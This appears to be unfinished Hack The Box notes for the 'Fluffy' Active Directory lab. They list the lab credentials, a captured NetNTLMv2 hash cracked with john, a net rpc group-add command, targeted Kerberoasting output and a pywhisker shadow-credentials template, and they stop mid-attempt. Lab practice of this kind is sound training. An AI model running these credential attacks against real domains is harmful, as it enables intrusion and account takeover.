# Fluffy HTB

initial credentials:

	-j.fleischman:J0elTHEM4n1990!
	-p.agila:prometheusx-303

  
```bash
❯ exiftool Upgrade_Notice.pdf

ExifTool Version Number : 12.57

File Name : Upgrade_Notice.pdf
Directory : .
File Size : 170 kB
File Modification Date/Time : 2025:05:25 00:31:09-05:00
File Access Date/Time : 2025:05:25 00:31:09-05:00
File Inode Change Date/Time : 2025:05:25 00:31:09-05:00
File Permissions : -rw-r--r--
File Type : PDF
File Type Extension : pdf
MIME Type : application/pdf
PDF Version : 1.4
Linearized : No
Page Count : 2
Tagged PDF : Yes
Language : en
Title : Upgrade Notice For IT Department
Create Date : 2025:05:17 07:22:32+00:00
Modify Date : 2025:05:17 07:22:32+00:00
Keywords : DAGnmrYlJoI, BAF-XVRpOno, 0
Author : p.agila

  
```

Performed another NTLM hash poisoning
 ```bash
  

p.agila::FLUFFY:2bab99b630a15dd2:D5D967459968BAF39F5C0C5B9C5F03E0:010100000000000080DBC91569CEDB0188D39C67382E133B0000000002000800430058004F00450001001E00570049004E002D0053003000470058003900490042004F0045004D004F0004003400570049004E002D0053003000470058003900490042004F0045004D004F002E00430058004F0045002E004C004F00430041004C0003001400430058004F0045002E004C004F00430041004C0005001400430058004F0045002E004C004F00430041004C000700080080DBC91569CEDB0106000400020000000800300030000000000000000100000000200000E71EC6A6FBC175AF187DEB6B9B9E97E10A9CF5E97D58D9D16E5322DA469CFFAA0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100350031000000000000000000

  
  

❯ john --wordlist=/opt/SecLists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
prometheusx-303 (p.agila)
1g 0:00:00:03 DONE (2025-05-26 18:09) 0.2840g/s 1283Kp/s 1283Kc/s 1283KC/s proquin14..programmer_pt
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.


```

Bloodhound p.agila can perform generic writes

```bash
  

net rpc group addmem "SERVICE ACCOUNTS" "p.agila" -U "fluffy.htb"/"p.agila"%'prometheusx-303' -S "10.129.210.69"

  

trying

https://raw.githubusercontent.com/ShutdownRepo/targetedKerberoast/refs/heads/main/targetedKerberoast.py

  

❯ python3 targetedKerberoast.py -v -d 'fluffy.htb' -u 'p.agila' -p 'prometheusx-303'
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[+] Printing hash for (ca_svc)
[+] Printing hash for (ldap_svc)
[+] Printing hash for (winrm_svc)

hashes not crackable

  
  

trying 2:

  

pywhisker.py -d "domain.local" -u "controlledAccount" -p "somepassword" --target "targetAccount" --action "add"

```